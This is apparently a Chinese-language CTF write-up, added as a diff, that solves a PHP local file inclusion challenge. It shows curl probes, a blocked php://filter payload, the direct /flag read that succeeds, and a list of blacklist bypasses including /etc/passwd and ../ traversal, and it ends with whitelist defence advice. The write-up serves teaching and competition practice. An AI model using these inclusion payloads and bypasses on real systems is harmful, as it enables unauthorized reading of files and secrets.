@@ -1,0 +1,270 @@
+# CTF Writeup — PHP 图书查询系统（文件包含漏洞）
+
+> **题目信息**
+> - 题目名称：PHP
+> - 分值：525 pts
+> - 靶机：`ctf.wanxze.space:32924`（动态实例）
+> - 平台：湖州师范学院校内选拔赛
+> - 漏洞类型：本地文件包含（LFI）+ 伪协议黑名单绕过
+> - 最终 Flag：`flag{d883a6dc-5bf6-49cc-862f-399eacd18373}`
+
+---
+
+## 一、题目长什么样：先看初始页面
+
+打开靶机地址，浏览器里看到的就是一个"图书查询系统"。
+
+用 curl 把服务器返回的完整内容抓下来看：
+
+```bash
+curl -i http://ctf.wanxze.space:32924
+```
+
+**这条命令在干什么：**
+- `curl` 是一个命令行工具，专门用来向服务器发 HTTP 请求、把服务器返回的内容打印到屏幕上，是 Web 题最基础的工具。
+- `-i` 参数的意思是"把响应头也一并显示出来"（不加的话只看网页正文）。响应头里能挖到服务器类型、参数等关键情报，所以 Web 题基本都要加 `-i`。
+- `http://...` 就是靶机地址。
+
+**返回结果：**
+
+```http
+HTTP/1.1 200 OK
+Host: ctf.wanxze.space:32924
+Connection: close
+X-Powered-By: PHP/7.0.33          ← 关键情报：后端是 PHP 7.0.33
+Content-type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <p>欢迎使用图书查询系统</p>
+    <p>请输入你要查询的书名</p>
+    <form action=# method="GET">
+        <input type="submit" value="未完成">
+    </form>
+    <p>请选择语言请输入"English"、"Chinese"又或者其他语言</p>
+    <form action=# method="GET">
+        <input type="text" name="Content"  require><br/>
+        <input type="submit" value="提交">
+    </form>
+</body>
+</html>
+```
+
+**这段 HTML 透露了什么：**
+
+1. **`X-Powered-By: PHP/7.0.33`** —— 服务器用 PHP 7.0.33 跑，这是识别漏洞类型的重要线索（PHP Web 题高频考点就是文件包含、反序列化、SQL 注入）。
+2. **两个表单**，都设了 `action=#`（提交后跳回本页）、`method="GET"`。
+3. **第二个表单有一个输入框，参数名叫 `Content`**：
+   ```html
+   <input type="text" name="Content" require>
+   ```
+   - `name="Content"` 表示用户输入的内容会作为 GET 参数 `Content` 发送给服务器。**这就是我们后面要攻击的入口。**
+   - `require` 是出题人手滑写错的（本意应该是 `required`），说明这题的代码是"能跑就行"的简易版，出题人没太在意前端细节——这类粗心往往意味着后端也没做严格过滤。
+4. **按钮 value="未完成"** —— 有点刻意，像是出题人埋的暗示，但最终证明它只是幌子，真正的入口是 `Content` 参数。
+
+---
+
+## 二、定位漏洞类型：一步步试探
+
+### 第 1 步：正常传参，建立基线
+
+```bash
+curl -i "http://ctf.wanxze.space:32924?Content=1"
+```
+
+**这条命令的意义：**
+- `?Content=1` 是 GET 请求传参的写法，问号后面跟"参数名=参数值"。这里让服务器接收 `Content` 的值是 `1`。
+- 目的是看**正常输入**时服务器返回什么，作为对照的"基线"。后面出现异常时，一对比就知道是哪里出了问题。
+
+**返回（截取关键部分）：**
+
+```html
+</body>
+</html>
+<br />
+<b>Warning</b>:  include(1): failed to open stream: No such file or directory
+in <b>/var/www/html/index.php</b> on line <b>32</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '1' for inclusion
+(include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php</b>
+on line <b>32</b><br />
+```
+
+**这段报错价值连城，逐字解读：**
+
+- **`include(1)`** —— 这是 PHP 内置函数 `include` 在报错。`include` 的作用是"把另一个文件的内容读进来，当作当前代码的一部分执行"。**它把用户输入的 `1` 直接当成文件路径去打开了。**
+- **`failed to open stream: No such file or directory`** —— 因为当前目录下不存在一个叫 `1` 的文件，所以打开失败。
+- **`in /var/www/html/index.php on line 32`** —— 报错发生在服务器的 `/var/www/html/index.php` 这个文件的第 32 行。**这等于直接告诉我们：第 32 行就是 `include($_GET['Content']);` 这行漏洞代码所在。**
+
+**结论：** 参数 `Content` 的值被直接塞进了 `include()`，没有任何过滤。这是一个标准的**任意文件包含漏洞（Local File Inclusion, LFI）**。
+
+用大白话解释这个漏洞有多危险：`include` 本来是让程序员引入自己写好的文件（比如公共头部、配置文件）。但这里它把**用户能控制的输入**当成了文件路径，于是攻击者可以指定服务器上的**任意文件**让 PHP 去读取——包括密码文件、配置、源码，甚至 flag。
+
+### 第 2 步：确认单引号等符号是否被过滤
+
+```bash
+curl -i "http://ctf.wanxze.space:32924?Content=1'"
+```
+
+**这条命令的意义：**
+- 传一个带**单引号**的 `1'`。
+- 这一步是为了区分漏洞类型：如果这是 SQL 注入，单引号会破坏 SQL 语句结构导致**数据库报错**；如果这是单纯的文件包含，单引号只会被当成**文件名的一部分**去尝试打开。
+- 所以这条命令主要在"排除 SQL 注入，确认文件包含"。
+
+**返回：**
+
+```html
+<b>Warning</b>:  include(1'): failed to open stream: No such file or directory
+in <b>/var/www/html/index.php</b> on line <b>32</b><br />
+```
+
+**解读：**
+- 报错变成了 `include(1')` —— 单引号原封不动被拼进了文件名。
+- **没有出现任何 SQL 相关报错**，证明这里跟数据库无关，纯粹是文件包含。
+- 单引号没被过滤，说明参数**原样传入了 include**。
+
+**至此漏洞定位完成：`index.php` 第 32 行存在任意文件包含，参数为 `Content`，无过滤。**
+
+---
+
+## 三、尝试伪协议：撞上黑名单
+
+文件包含读源码的标准姿势是用 `php://filter` 伪协议。
+
+**什么是伪协议？** PHP 里除了能打开真实文件，还支持一批以 `协议://` 开头的"虚拟文件流"，统称 wrapper（封装协议）。`php://filter` 是其中最常用的一个，它可以在读取文件时做"过滤处理"——最经典的是 `convert.base64-encode`，意思是"把文件内容先转成 Base64 再返回"。
+
+**为什么要转 Base64？** 因为如果直接读 `index.php`，服务器会把 PHP 源码当成 PHP 代码**执行**，只输出执行结果、不输出源码。加了 Base64 编码后，内容就变成了纯文本字符串，不会再被当成代码执行，我们就能拿到**原始源码**了。
+
+于是执行：
+
+```bash
+curl -i "http://ctf.wanxze.space:32924?Content=php://filter/convert.base64-encode/resource=index.php"
+```
+
+**这条命令在干什么：**
+- `php://filter` —— 使用 PHP 的过滤器伪协议。
+- `convert.base64-encode` —— 指定"把读取到的内容做 Base64 编码"。
+- `resource=index.php` —— 指定要读取的目标文件是 `index.php`。
+- 连起来就是："读取 `index.php` 的内容，并把它 Base64 编码后返回给我。"
+
+**返回：** 页面末尾只有一个孤零零的：
+
+```
+no
+```
+
+**这说明什么：**
+
+- 正常情况下应该返回一大段 Base64 字符串，现在只有一个 `no`。
+- 这是出题人**故意设的拦截**。后端代码里大概长这样：
+
+```php
+$content = $_GET['Content'];
+if (strpos($content, 'php://') !== false) {   // 检查是否含关键字 php://
+    echo "no";
+    exit;
+}
+include($content);   // 第 32 行
+```
+
+**用大白话翻译这段防守逻辑：**
+- `strpos($content, 'php://')` —— 检查用户输入里**有没有出现 `php://` 这个字符串**。
+- `!== false` —— 如果出现了。
+- `echo "no"; exit;` —— 就直接输出 `no` 并结束程序，不给 include 机会。
+
+**也就是说，只要你的输入里带了 `php://`，就被拦。** 这就是所谓的**关键词黑名单**。
+
+**关键推断：** 这种黑名单通常很"朴素"——只匹配了 `php://` 这一个关键词，其他协议（`file://`、`data://`、`phar://`）和**普通的文件路径**很可能根本没被拦。而且最朴素的写法甚至不管大小写。这就给我们留了口子。
+
+---
+
+## 四、绕过黑名单：回到"最朴素"的思路
+
+思路一：既然黑名单只拦 `php://`，那**不带伪协议的直接路径**它拦不拦？肯定不拦——因为黑名单里压根没写路径规则。
+
+思路二：flag 文件最可能存在的位置是什么？通常就是根目录 `/flag`，或者 Web 根目录下的 `flag.php`。
+
+于是直接试：
+
+```bash
+curl -i "http://ctf.wanxze.space:32924?Content=/flag"
+```
+
+**这条命令在干什么：**
+- `Content=/flag` —— 直接让 `include` 去打开服务器根目录下的 `/flag` 文件。
+- 没有用任何伪协议，所以绕过了 `php://` 关键词黑名单。
+- `include` 本质就是"读文件"，给它一个绝对路径 `/flag`，它就照读不误。
+
+**返回：**
+
+```
+flag{d883a6dc-5bf6-49cc-862f-399eacd18373}
+```
+
+**成功。** Flag 到手。
+
+---
+
+## 五、完整攻击链总结
+
+| 步骤 | 命令 | 目的 | 结果 |
+| --- | --- | --- | --- |
+| 1 | `curl -i http://靶机` | 获取首页、响应头情报 | 发现 `X-Powered-By: PHP/7.0.33`，表单参数 `Content` |
+| 2 | `curl "http://靶机?Content=1"` | 正常传参建立基线 | 报错 `include(1)`，定位漏洞在第 32 行 |
+| 3 | `curl "http://靶机?Content=1'"` | 排除 SQL 注入 | 无 SQL 报错，确认是纯文件包含 |
+| 4 | `curl "http://靶机?Content=php://filter/..."` | 尝试读取源码 | 返回 `no`，发现 `php://` 被黑名单拦截 |
+| 5 | `curl "http://靶机?Content=/flag"` | 用裸路径绕过黑名单 | 直接读到 flag ✅ |
+
+---
+
+## 六、这题教会我们的三个知识点
+
+### 1. 报错信息是最好的情报来源
+
+PHP 默认开启 `display_errors` 时，`Warning` 会把**文件绝对路径、出错行号、函数名**全部打印出来。这题几乎是"白送"——不用猜，报错直接告诉我们第 32 行有 `include`，参数是 `Content`。**实战中遇到报错，第一反应不是关掉它，而是逐字读完它。**
+
+### 2. 文件包含不一定要用伪协议
+
+很多人一看到文件包含，条件反射就去背 `php://filter` 的 payload。但这题证明：**当伪协议被黑名单拦截时，最朴素的绝对路径或相对路径反而能直接命中。**
+
+黑名单的常见弱点：
+- 只匹配小写 → 可以试 `PHP://`、`Php://`
+- 只匹配某个关键词 → 可以试 `file://`、`data://`、`phar://`
+- 只拦伪协议 → 系统路径（`/flag`、`/etc/passwd`、`../../../`）完全不受影响
+
+**绕过优先级建议：系统绝对路径 > 其他伪协议 > 大小写/双写变形。**
+
+### 3. include 的本质就是"读文件"
+
+理解 `include` 是"把目标文件的内容读进来"，就能明白为什么给 `/flag` 就能直接出 flag——它只是忠实地去打开了这个文件。同理，想验证漏洞通不通，`/etc/passwd` 是 Linux 下最好用的探针文件。
+
+---
+
+## 七、防御建议（答题者视角）
+
+如果这是真实业务系统，正确的写法应该是：
+
+```php
+// 方案一：白名单，只允许包含指定的几个文件
+$allow = ['english.php', 'chinese.php'];
+$lang = $_GET['Content'];
+if (in_array($lang, $allow)) {
+    include($lang);
+} else {
+    die('非法请求');
+}
+```
+
+**核心思想：** 不要让用户的输入决定"要包含哪个文件"。要么用**白名单**固定可包含的文件列表，要么干脆不用 include、直接把语言文案写成数组。
+
+---
+
+## 附录：Flag
+
+```
+flag{d883a6dc-5bf6-49cc-862f-399eacd18373}
